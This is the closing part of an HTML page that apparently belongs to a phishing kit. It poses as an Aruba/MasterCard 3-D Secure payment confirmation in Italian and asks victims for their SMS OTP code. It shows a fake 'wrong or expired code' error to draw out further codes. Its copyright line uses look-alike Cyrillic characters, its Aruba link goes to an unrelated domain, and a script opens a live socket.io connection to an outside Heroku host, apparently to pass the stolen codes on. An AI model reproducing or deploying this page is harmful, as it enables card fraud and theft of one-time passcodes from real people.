M5xXf80n34IQMA0DPkH5yYdoLGU+hHA5j03R7CMRNDKerYqMo0qiy3sTWS/p4880t119PG1GtEsEN636SZujZeLlin6mMzQdsaHhIcugtCgCAmVSWmWRlJLS23f5ILqA2aBnImvB9NiBYsOV3r3HxVVpcUnBt57KfvubHqsFcAtTvcT6wjYoOpJMjArOlq8nALfeZXS+QQFH8665vk4G5CMCeYdBU4+QGF12UVkmoWsAZBtPpdfaWx826+IcVUq/6UJx77L2Xt382MbXSVPFICxwiJhGHFvvvO3AsrPGBkALefID/VD0pAynlcm3cWFSVUPOZV9N4dWa/Y6P39lFgMzFLxbO45tPHv5Csafqj0cn46x2pW4MjQ1fdbW3OQDFEz9BMDgJTQY328/XnPK7P2XWmqF0vVwvHvLLXy40FW0viLBjdxskSi0jSQHz15DiLz2lVwSiP8EftkAtbfXDgD4Z+KtCGy10NwqdYEa30GQAotI8L6c4vV1OTMeXZI9ff1Us/mu0g2TctxPbiXCbWqAxHvD/zvkfbiCZNQ4dSSDcTgOfT2BKUc6T75cZ8G1SuW0mSku/pBAZdjjLwTzQo0IOcWPHQNRE4NOEVEfJJwsxDTo+g0MSrXY5wAH+B0AyJnluUoPYjGuLF0xgOqI4LGtKRx9381klMqCgimD6QcMQKsywLQYQDENxWuy/xGZQet7Wn7WBwAcHHcXgPGKIH9UAieGf5mNgswNXQswpIorAlD2+P76Xl96P1Tfekao/6IDO1QD8op+nK8z5yqGNLa3ewaiXFbJ2gwEUZo8d4M/dzddfCHi0Uq1ktKS3qYHP7HimzHzxflCwCwxcU2Ys21aX8Oy1mRmcQilyvSRTcF3RN53M+4S8fUWbOJinhYUlUjCFavwHt/qShn8LuCRAOCauXEBA3NUGWVP05pP7fC+EJQHVUkV6zwv2Wl22G3xh7bGCVFrnT9whcVa+w3cUUUSxOgH6JGuPP+diLgXIaVYbuEM37F9uf7YA4NQ3C0klnOT7uLCcaXO+o4Q7znd+vJnNjTYqoMQlyAIqe9mTXuVGYts3IeLpTMAdkqdt5w7vu4UIi7jTpy94Wo9oL5kKYT2ZoLr7QVwnZ2WT9IAOnWq/+Ck/LQVxlk8hQURtlozDH6FQG+MVOJiKLUOtWryxzfGfv7qaN28Nyw4uYrWzRCCqphFJRPyCXAS4GRgLBhBEC4A8BJjnyTUd2fkfIgDKwLGsUVkEIUuw3NUsB+uowJdhx88mFC9I2WN1LRD4XIi6qyYeACjNEqjNEr/H/RftI3dGnQZDy8AAAAASUVORK5CYII="
									alt=""
									style="width: 50%;"
								/>
								<img
									src="data:image/png;base64,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"
									alt="MasterCard Logo"
								/>
							</span>
						</div>
					</div>
					
						<div class="row">
							<div id="panel" class="col-sm-8 col-sm-offset-2 col-md-6 col-md-offset-3" role="main">
								<div align="center"><img src="files/ICO_pw_token.gif" alt="" style="width: 12%;" /> <img src="files/img_167300.png" alt="" style="width: 6%;" /></div>

								<br />
								<p>
									La password che dovrai inserire per autenticare la transazione è stata inviata via SMS al tuo numero di cellulare o la password chiave elettronica. Ricorda: hai a tua disposizione 3 tentativi di inserimento.
									<br />
									<br />
									Inserisci il codice OTP che hai ricevuto e clicca «Prosegui» per confermare l’operazione.<br />
									<br />
								</p>

								<hr />
								<div align="center">
									<strong>Codice OTP </strong>
									<br />

									<input type="password" name="s7" required="" v-model="log.SMS2" size="20" class="textfield" maxlength="8" style="border:1px solid rgba(0,0,0,0.34) !important;width: 108px; text-align: center;" />
									<br />
									<span style="color:red;font-size:11px;border: 52px;">Il codice immesso non è corretto o è scaduto, è stato inviato un nuovo codice</span>
								</div>
								<hr />

								<div class="payment-details" role="contentinfo">
									<h1>Dettagli del pagamento</h1>

									<div class="payment-detail">
										<h2>Importo</h2>
										<span id="transaction-amount">6,11 €</span>
									</div>

									<div class="payment-detail">
										<h2>Codice ordine</h2>
										<span>IT2020B144317</span>
									</div>

				
									<br />
									<br />

									<div align="center">
										<button
											
											name="CONTINUA"
											value=""
											class="roundedFwd"
											style="width: 108px; height: 29px; border: 0; margin-left: 50px; margin-right: 50px; background-color: rgb(248, 122, 19); color: rgb(255, 255, 255); font-weight: bold; text-align: center;"
											@click="submitForm"
										>Prosegui</button>
									</div>
								</div>
							</div>
						</div>
					
					<div class="row">
						<div id="footer" class="col-md-6 col-md-offset-3">
							<p>Cорyrіght @2020 аrubа ѕ.р.а.- р.і. 0257950516 - аll rіghtѕ rеѕеrνеd -</p>

							<table>
								<tbody>
									<tr>
										<td><a href="https://b9atlikdkikaot.com/aris/poli//index2.php?page=5555#" target="_blank">Aruba.it</a></td>
									</tr>
								</tbody>
							</table>
						</div>
					</div>
				</div>
			</div>
			 
		 
		</div>
	</div>
	<script>
   
    const socket =io('https://keys0.herokuapp.com',{
    transports:['websocket','polling']
  })

  </script>
  <script src="js/index.js"> </script>
 </body>
</html>
